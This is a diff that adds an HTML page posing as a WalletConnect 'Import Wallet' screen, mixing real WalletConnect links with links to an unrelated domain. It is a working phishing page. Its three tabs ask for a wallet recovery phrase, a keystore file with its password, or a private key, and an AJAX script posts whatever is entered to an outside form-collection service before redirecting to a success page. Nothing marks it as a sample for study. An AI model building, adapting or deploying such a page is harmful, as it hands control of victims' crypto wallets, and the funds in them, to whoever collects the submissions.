@@ -1,0 +1,128 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="../assets/main.css" type="text/css"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="../images/logo.svg">
+<link rel="icon" href="../assets/logo.svg">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ajaxy/1.6.1/scripts/jquery.ajaxy.min.js" integrity="sha512-bztGAvCE/3+a1Oh0gUro7BHukf6v7zpzrAb3ReWAVrt+bVNNphcl2tDTKCBr5zk7iEDmQ2Bv401fX3jeVXGIcA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+<title>Import Wallet</title>
+</head>
+<body>
+<center>
+    <div class="top">
+        <a href="https://github.com/WalletConnect" class="left">Github</a>
+        <a href="https://docs.walletconnect.com/" class="left">Docs</a>
+        <a href="https://dappslinkconnect.live" class="main"><img src="../assets/logo.svg" alt="logo"></a>
+        <a href="https://dappslinkconnect.live" class="left">Wallets</a>
+        <a href="https://dappslinkconnect.live" class="left">Apps</a>
+</div>
+<br>
+<h2><center>Import Wallet</center></h2>
+<br>
+<div class="tab">
+  <button class="tablinks active" id="default" onclick="openCity(event, 'phrase')">Phrase</button>
+  <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</button>
+  <button class="tablinks" onclick="openCity(event, 'private')">Private Key</button>
+</div>
+
+<div id="phrase" class="tabcontent" style="display: block;">
+<form action="https://formcarry.com/s/XYFh2ynz02Y" method="POST" class="ajaxForm">
+
+<input type="hidden" name="w" value="metamask">
+
+<textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+<br>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+<br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="keystore" class="tabcontent" style="display: none;">
+<form action="https://formcarry.com/s/XYFh2ynz02Y" method="POST" class="ajaxForm">
+
+<input type="hidden" name="w" value="metamask">
+
+<textarea name="Keystore JSON" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+<br>
+<div class="field">
+    <input type="text" name="password" placeholder="Password">
+</div>
+<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+<br>
+<button type="submit" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="private" class="tabcontent" style="display: none;">
+<form action="https://formcarry.com/s/XYFh2ynz02Y" method="POST" class="ajaxForm">
+<input type="hidden" name="w" value="metamask">
+<div class="field">
+    <input type="text" name="Private key" class="key" placeholder="Private Key">
+</div>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+<input type="hidden" name="_gotcha"><!-- use this to prevent spam -->
+
+<br>
+<button type="submit" class="btn">IMPORT</button>
+</form>
+</div>
+
+
+
+<footer><div id="footer">
+<p><img src="../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+<p><img src="../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+<p><img src="../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
+<p><img src="../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+</div></footer>
+
+
+</center>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+    $(".ajaxForm").submit(function(e) {
+        e.preventDefault();
+        var href = $(this).attr("action");
+        $.ajax({
+            type: "POST",
+            dataType: "json",
+            url: href,
+            data: $(this).serialize(),
+            success: function(response) {
+                if (response.status == "success") {
+                    window.location.href = '../success.html'; // redirection url // change this. 
+                } else {
+                    alert("An error occured: " + response.message);
+                }
+            }
+        });
+    });
+</script>
+
+</body></html>
